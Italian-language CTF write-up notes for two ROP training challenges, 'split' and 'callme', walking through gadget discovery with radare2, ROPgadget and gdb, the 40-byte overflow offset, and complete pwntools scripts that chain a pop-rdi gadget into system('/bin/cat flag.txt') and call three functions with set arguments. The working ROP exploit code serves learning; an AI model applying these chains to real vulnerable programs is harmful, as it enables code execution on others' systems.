1)split
  La classica iniezione tipo shellcode non ci è utile a causa di W^X.
  Iniziando:
    1)Il testo ci dice che nel .bin c'è una stringa salvata che ci serve. Quindi ispezioniamo la parte .data con r2 (radare 2)
    	r2 split
    	iz
    	=>0x00601060 17  18   .data   ascii /bin/cat flag.txt
    	
    2)Il nostro obiettivo è di fare una chiamata system che mi apra una shell ed eseguire quel comando. system() ha un parametro. Quindi ci serve un gadget per caricare il valore di cui necessitiamo in rdi
    
    	ROPgadget --binary "./split" | grep "rdi"
    		=>0x00000000004007c3 : pop rdi ; ret
    
    3)Manca solamente l'indirizzo della chiamata (gdb)
    	p system
    	=>$1 = {<text variable, no debug info>} 0x400560 <system@plt>
    	
    4)Gadget eventuale allineamento stack
    	ROPgadget --binary "./split" | grep "ret"
    	=>0x000000000040053e : ret 
  Ora:
  buffer overflow:
  	buffer[32];
  	RBP => 8 B
  	RSP (payload trascurabile)
  	RIP
  Si inizia ad overlodare il RIP dopo 40 Bytes di garbage
  
  from pwn import *
  p=process('./split') 
  garbage=b'A'*40
  gadget_rdi=p64(0x00000000004007c3) #pop rdi;ret
  ind_flag= p64(0x00601060)
  allineamento=p64(0x000000000040053e)#ret
  syscall=p64(0x400560) 
  payload=garbage
  payload+= gadget_rdi + ind_flag + allineamento + syscall
  p.sendline(payload)
  p.interactive()
  
  =>ROPE{a_placeholder_32byte_flag!}

2)callme
  =>Anche in questa challenge abbiamo:
  	NX        : ENABLED
  Questo ci suggerisce che ci sia una tecnica W^X attiva. Perciò sappiamo che dobbiamo usare una ROP chain;
  La consegna ci dice di invocare 3 funzioni con i vari parametri; nota che siamo in un'architettura a 64bit. Un'idea potrebbe essere inviare una chain;
  Da notare che:
  	prima: la shellcode veniva iniettata nel buffer perchè era un'area di memoria sia scrivibile che eseguibile;
  	ora: A causa di tecniche come W^X, iniettiamo una ROP chain come indirizzo di ritorno (=>sequenza di indirizzi)

  a)Cerchiamo di capire la struttura del buffer
  		buffer[32]
  		RBP[8]
  		RSP(trascurabile)
  		RIP
  	=>perciò per raggiungere il RIP mi servono 40Bytes di garbage
  
  b)dobbiamo caricare i 3 valori dei parametri in dei registri; cerchiamo il gadget adeguato
  	ROPgadget --binary "./callme" | grep "pop"	
  	=>0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
  
  c)abbiamo bisogno dell'indirizzo delle funzioni
  	callme_one=>   0x0000000000400720
  	callme_two=>   0x0000000000400740
  	callme_three=> 0x00000000004006f0
  
  d)infine necessitiamo del gadget per riallineare lo stack prima delle chiamate a funzioni
  	ROPgadget --binary "./callme" | grep "ret"
  	=>0x00000000004006be : ret
  	
  	
  Ora dovremmo avere tutti gli ingredienti
  nota: 
  	-Per ogni chiamata, devi caricare nuovamente i valori nei registri, altrimenti la funzione successiva riceverà argomenti errati.
  	-Prima di chiamare una qualsiasi funzione devi allineare lo stack!
  	
  from pwn import *
  p=process('./callme')
  garbage=b'A'*40
  registri=p64(0x000000000040093c)
  value1=p64(0xdeadbeefdeadbeef)
  value2=p64(0xcafebabecafebabe)
  value3=p64(0xd00df00dd00df00d)
  allineamento=p64(0x00000000004006be)
  func1=p64(0x0000000000400720)
  func2=p64(0x0000000000400740)
  func3=p64(0x00000000004006f0)
  payload= garbage + allineamento + registri + value1 + value2 + value3 +func1
  #for each call you have to allocate the values in the registers
  payload += allineamento + registri + value1 + value2 + value3 + func2 +allineamento
  payload+= registri + value1 + value2 + value3 + func3
  p.sendline(payload)
  print(p.recvall())
  
  =>ROPE{a_placeholder_32byte_flag!}
  
